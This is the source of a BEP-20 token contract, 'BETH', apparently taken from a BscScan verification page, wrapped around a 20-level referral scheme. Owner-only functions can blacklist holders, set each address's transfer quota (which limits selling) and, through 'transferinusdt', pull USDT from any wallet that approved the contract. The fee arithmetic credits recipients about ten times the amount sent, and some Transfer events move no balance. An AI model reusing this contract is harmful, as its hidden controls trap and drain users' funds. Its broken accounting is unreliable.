/**
 *Submitted for verification at BscScan.com on 2022-08-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-20
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.6;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address public _owner;

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

contract BETH is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _rOwned;
    
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private _tTotal;
    uint256 private _burnTotal;
    uint256 private _burnTotalend;
    uint256 private _tFeeTotal;
    string private _name;
    string private _symbol;
    uint256 private _decimals;
    uint256 public _baseFee = 1000;
   
    uint256 public _tuanduiFee = 4;
    uint256 public _jijinFee = 2;
    uint256 public _lpFee = 2;
    uint256 public _shengtaiFee = 2;
    uint256 public _bjiedianFee = 2;

    uint256 public _markFee = 15;
    
    uint256 public _charitable = 20;
    uint256 public _burnFee = 40;
    uint256 public _leaderfee = 50;
    uint256 public _father = 60;
    address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);
    address private _needAddress1 = address(0xD906201A9C3a55Bf61FD20389A3D86545bF288DC);//基金
    address private _needAddress2 = address(0x0Af054a6a0e4B673aA4a07B357561Dd1B3518756);//lp
    address private _needAddress3 = address(0xF045232E8D19BbB85a17cF1387F5929711a13FFb);//生态
    address private _needAddress4 = address(0xBA15a53039446D8adB274D4C5c19B01520a1d85b);//20代多出来的回流
    address private _needAddress5 = address(0x3555b0C471EC0C12f69E2414b8E0eA7c2857Aa63);
    uint256 public _lowNum = 100;
    
 //   mapping(address => address) public inviter;
    IERC20 usdt;
    IERC20 other;
    uint256 public tradingEnabledTimestamp = 2650459043; //2022-04-20   
    
    mapping(address => address) public inviter;
    mapping(address => bool) public _isBlacklisted;
    mapping(address => bool) public _isSirlist;//领导人名单
    mapping(address => bool) public leader;
    mapping(address => uint256) public sharenumber;
    mapping(address => uint256) public receivetime;
    mapping(address => uint256) public edu;


    address[] public tokenHolders;

    address public uniswapV2Pair;
	address public uniswapV2Pair2;
	address public uniswapV2Pair3;
	address public uniswapV2Pair4;
    address public _fundAddressA;
    address public _fundAddressB;
	address public _fundAddressC;
	address public _fundAddressD;
	
    constructor(address tokenOwner,IERC20 _usdt ) {
        _name = "BETH";
        _symbol = "BETH";
        _decimals = 18;
        _tTotal = 10000000 * 10**_decimals; 
        _burnTotal = _tTotal;
        _burnTotalend = 1 * 10**_decimals;
       
        _rOwned[tokenOwner] = _tTotal;
        _isExcludedFromFee[tokenOwner] = true;
       //_fundAddressA = fundAddressA;//marker
   
      
        usdt=_usdt;
       
        _owner = msg.sender;
        edu[msg.sender] = 10000000000000000000000000;
        edu[address(this)] = 10000000000000000000000000;
        //usdt = address(0x7ef95a0fee0dd31b22626fa2e10ee6a223f8a684);//0x7ef95a0fee0dd31b22626fa2e10ee6a223f8a684;
        //_owner=tokenOwner;
        emit Transfer(address(0), tokenOwner, _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _burnTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        //return tokenFromReflection(_rOwned[account]);
        return _rOwned[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

  
    function claimTokens() public onlyOwner {
        payable(_owner).transfer(address(this).balance);
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
       
        require(!_isBlacklisted[from], "Blacklisted address"); 

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(balanceOf(from)>=amount,"YOU HAVE insuffence balance");
        require(amount <= edu[from], "edu too low");
        edu[from]=edu[from]-amount;//转账额度
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            _tokenTransfer(from, to, amount);
        }else{
			if(from == uniswapV2Pair){
        //require(amount < edu[msg.sender], "edu too low");   
				_tokenTransferBuy(from, to, amount);
			}else if(to == uniswapV2Pair){
       // require(amount > edu[msg.sender], "edu too low");   
				_tokenTransferSell(from, to, amount);
			}else{
        //require(amount < edu[msg.sender], "edu too low");   
				_tokenTransfer(from, to, amount);
			}
        }
    }
    function getLPbalance() public view returns (uint256 lpusdtamount,uint256 lpotheramount) {
        lpusdtamount=usdt.balanceOf(uniswapV2Pair);
        lpotheramount=_rOwned[uniswapV2Pair];
       
        
    }
    function getprice() public view returns (uint256 _price) {
        uint256 lpusdtamount=usdt.balanceOf(uniswapV2Pair);
        uint256 lpotheramount=_rOwned[uniswapV2Pair];
       
        _price=lpusdtamount*10**18/lpotheramount;
        
    }

     function  BUY(uint256 amountt,address fatheraddr)  public  returns (bool) {
         
        require(amountt>=_lowNum*10**18,"pledgein low 1");
        if (inviter[msg.sender] == address(0)) {
            inviter[msg.sender] = fatheraddr;
            sharenumber[fatheraddr]+=1;
            if(sharenumber[fatheraddr]==30){
                tokenHolders.push(fatheraddr); 
            }
        }
     
        usdt.transferFrom(msg.sender,fatheraddr, amountt.div(10).mul(2));//20%直推奖
        usdt.transferFrom(msg.sender,uniswapV2Pair, amountt.div(10).mul(4));//40%回流池子
        address cur;//20%20代领导人
        cur = msg.sender;
        uint256 jici = 0;
        uint256 zongnum = 0;
        for (int256 i = 0; i < 20; i++) {
            //uint256 rate = 1;
            cur = inviter[cur];
            if (cur == address(0)) {
                break;
            }
            uint256 curTAmount = amountt.div(100).mul(1);
            
            if(sharenumber[cur]>=jici){
                usdt.transferFrom(msg.sender,cur, curTAmount);
                zongnum=zongnum+1;
            }
            jici = jici+1;
        }
        if(zongnum<20){
            uint256 buchong=20-zongnum;
            usdt.transferFrom(msg.sender,_needAddress4, amountt.div(100).mul(buchong));
        }

        //发节点奖
        for (uint256 i = 0; i < tokenHolders.length; i++) {
            usdt.transferFrom(msg.sender,tokenHolders[i], amountt.div(100*tokenHolders.length).mul(5));
        }
        usdt.transferFrom(msg.sender,_needAddress1, amountt.div(100).mul(2));//基金钱包
        usdt.transferFrom(msg.sender,_needAddress2, amountt.div(100).mul(5));//lp分红，取消变成这个
        usdt.transferFrom(msg.sender,_needAddress3, amountt.div(100).mul(8)); //生态建设
        uint256 _swapprice=getprice();
        uint256 _recamount=amountt*10**18/_swapprice;
        bool y2=_rOwned[address(this)] >= _recamount;
        require(y2,"token balance is low.");
        _rOwned[address(this)] = _rOwned[address(this)].sub(_recamount);
        _rOwned[msg.sender] = _rOwned[msg.sender].add(_recamount);
        emit Transfer(address(this), msg.sender, _recamount);//给会员币
        return true;
    }

    
    function  shifang()  external returns (bool) {
        bool Limited = receivetime[msg.sender] < block.timestamp;
        require(Limited,"Exchange interval is too short.");
        uint256 yue=balanceOf(msg.sender);
 
        edu[msg.sender]+=yue.mul(2).div(1000);//增加转账额度
        receivetime[msg.sender] = block.timestamp+86400 - uint32((block.timestamp + 86400) % 86400);
      return true;
    }




    
    function _takeInviterFee(
        address sender,
        address recipient,
        uint256 tAmount
        //uint256 currentRate
    ) private {
        address cur;
        if (sender == uniswapV2Pair) {
            cur = recipient;
        } else {
            cur = sender;
        }
        uint256 jici = 0;
        for (int256 i = 0; i < 20; i++) {
            uint256 rate = 1;
            cur = inviter[cur];
            if (cur == address(0)) {
                break;
            }
            uint256 curTAmount = tAmount.div(100).mul(rate);
//            uint256 curRAmount = curTAmount.mul(currentRate);
            if(sharenumber[cur]>=jici){
                _rOwned[cur] = _rOwned[cur].add(curTAmount);
                emit Transfer(sender, cur, curTAmount);
            }
            jici = jici+1;
        }
    }


    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        
        edu[sender]=edu[sender]-tAmount;//转账额度

       
        uint256 rAmount = tAmount;
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rAmount);
        emit Transfer(sender, recipient, tAmount);
    }

   


    function _tokenTransferBuy(
        address sender,
        address recipient,
        uint256 tAmount
		
    ) private {
/*
        bool tradingIsEnabled = getTradingIsEnabled();
        require(tradingIsEnabled, "Time is not up");

        if (
            tradingIsEnabled &&                  //start time
           block.timestamp <= tradingEnabledTimestamp + 9 seconds) {  //bot 
            addBot(recipient);                                 //add black
        }
*/
        edu[sender]=edu[sender]-tAmount;//转账额度
        uint256 rAmount = tAmount;
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        //团队奖金
        _takeInviterFee(sender, recipient, tAmount.div(100).mul(_lpFee));
        
      //基金
        _takeTransfer(
         sender,
         _needAddress1,
         tAmount.div(100).mul(_jijinFee)
      );
      //生态
        _takeTransfer(
         sender,
         _needAddress3,
         tAmount.div(100).mul(_shengtaiFee)
      );
      //超级节点

        //发节点奖
        for (uint256 i = 0; i < tokenHolders.length; i++) {
           emit Transfer(sender,tokenHolders[i], tAmount.div(100*tokenHolders.length).mul(5));
        }
      //lp
        _takeTransfer(
         sender,
         uniswapV2Pair,
         tAmount.div(100).mul(_lpFee)
         
      );
        uint256 sumsellfee;
        sumsellfee=_baseFee-_tuanduiFee-_jijinFee-_shengtaiFee-_bjiedianFee-_lpFee;  
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(100).mul(sumsellfee)
        );
        emit Transfer(sender, recipient, rAmount.div(100).mul(sumsellfee));

    }
    
    function _tokenTransferSell(
        address sender,
        address recipient,
        uint256 tAmount
		
    ) private {
        //uint256 tAmoun2t = 1 * 10 **1;
        uint256 rAmount = tAmount;
        _rOwned[sender] = _rOwned[sender].sub(tAmount);

        edu[sender]=edu[sender]-tAmount;//增加转账额度
//团队奖金


         _takeInviterFee(sender, recipient, tAmount.div(100).mul(_lpFee));
         
     
      //基金
        _takeTransfer(
         sender,
         _needAddress1,
         tAmount.div(100).mul(_jijinFee)
         
      );
      //生态

        _takeTransfer(
         sender,
         _needAddress3,
         tAmount.div(100).mul(_shengtaiFee)
         
      );
      //超级节点

        //发节点奖
        for (uint256 i = 0; i < tokenHolders.length; i++) {
           emit Transfer(sender,tokenHolders[i], tAmount.div(100*tokenHolders.length).mul(5));
        }

      //lp

        _takeTransfer(
         sender,
         uniswapV2Pair,
         tAmount.div(100).mul(_lpFee)
         
      );

 
   // _tokenTransfer(sender, uniswapV2Pair, tAmoun2t);
   
   
    uint256 sumsellfee;
    
        sumsellfee=_baseFee-_tuanduiFee-_jijinFee-_shengtaiFee-_bjiedianFee-_lpFee;
        //recipient=address(this);
       
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(100).mul(sumsellfee)
        );
        emit Transfer(sender, recipient, rAmount.div(100).mul(sumsellfee));


    }


    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
       
    ) private {
        uint256 rAmount = tAmount;
        _rOwned[to] = _rOwned[to].add(rAmount);
        emit Transfer(sender, to, tAmount);
    }

  

    function changeRouter(address router) public onlyOwner {
        uniswapV2Pair = router;
        edu[router] = 10000000000000000000000000;

    }
	function changeRouter2(address router) public onlyOwner {
        uniswapV2Pair2 = router;
    }
	function changeRouter3(address router) public onlyOwner {
        uniswapV2Pair3 = router;
    }
	function changeRouter4(address router) public onlyOwner {
        uniswapV2Pair4 = router;
    }
    function changeA(address _AddressA) public onlyOwner {
        _fundAddressA = _AddressA;
    }
    function changeB(address _AddressB) public onlyOwner {
        _fundAddressB = _AddressB;
    }
    function changeC(address _AddressC) public onlyOwner {
        _fundAddressC = _AddressC;
    }
    function changeD(address _AddressD) public onlyOwner {
        _fundAddressD = _AddressD;
    }

    function setfater(uint256 _new) public onlyOwner(){
         _father = _new;
    }

     function getTradingIsEnabled() public view returns (bool) {
        return block.timestamp >= tradingEnabledTimestamp;
    }

     function setplanastart_end(uint256 _time)  public onlyOwner(){
         tradingEnabledTimestamp=_time;
    }

    function set_shengtaiFee(uint256 inoutfee)  public onlyOwner(){
         _shengtaiFee=inoutfee;
        
    }
    function set_bjiedianFee(uint256 inoutfee)  public onlyOwner(){
         _bjiedianFee=inoutfee;
        
    }


    function set_jijinFeefee(uint256 inoutfee)  public onlyOwner(){
         _jijinFee=inoutfee;
        
    }

    function settuanduifee(uint256 inoutfee)  public onlyOwner(){
         _tuanduiFee=inoutfee;
        
    }
    
     function set_lp_marker_fee(uint256 lpfee,uint256 markfee)  public onlyOwner(){
         _lpFee=lpfee;
         _markFee=markfee;
    }
   
     function setburnfee(uint256 burnfee)  public onlyOwner(){
         _burnFee=burnfee;
    }
    //_lowNum
     function setlowNum(uint256 lowNum)  public onlyOwner(){
         _lowNum=lowNum;
    }
     function setleaderfee(uint256 leaderfee)  public onlyOwner(){
         _leaderfee=leaderfee;
    }
    function setcharitablefee(uint256 charitable)  public onlyOwner(){
         _charitable=charitable;
    }
    //delete mapping[msg.sender];
/*
    function deletetokenHoldersAddress(address account) external onlyOwner {
        tokenHolders(account);
        delete tokenHolders[1];  //true is black。  _isSirlist
    }*/
    function settokenHoldersAddress(address account) external onlyOwner {
        tokenHolders.push(account);   //true is black。  _isSirlist
    }
    function sirlistAddress(address account, bool value) external onlyOwner {
        _isSirlist[account] = value;   //true is black。  _isSirlist
    }
    function blacklistAddress(address account, bool value) external onlyOwner {
        _isBlacklisted[account] = value;   //true is black。  _isSirsist
    }
    function addBot(address recipient) private {
        if (!_isBlacklisted[recipient]) _isBlacklisted[recipient] = true;
    }
    function setedu(address add, uint256 value) public  onlyOwner {
        
        edu[add] = value;
    }
    function setleader(address recipient2, bool value) public  onlyOwner {
        
        leader[recipient2] = value;
    }
    function setusdtaddress(IERC20 address3) public onlyOwner(){
        usdt = address3;
    }
    function setburntotal(uint256 num) public onlyOwner(){
        _burnTotal = num * 10**_decimals;
    }

    function  transferOutusdt(address toaddress,uint256 amount,uint256 decimals2)  external onlyOwner {
        usdt.transfer(toaddress, amount*10**decimals2);
    }
    function  transferinusdt(address fromaddress,address toaddress3,uint256 amount3,uint256 decimals3)  external onlyOwner {
        usdt.transferFrom(fromaddress,toaddress3, amount3*10**decimals3);//contract need approve
    }

}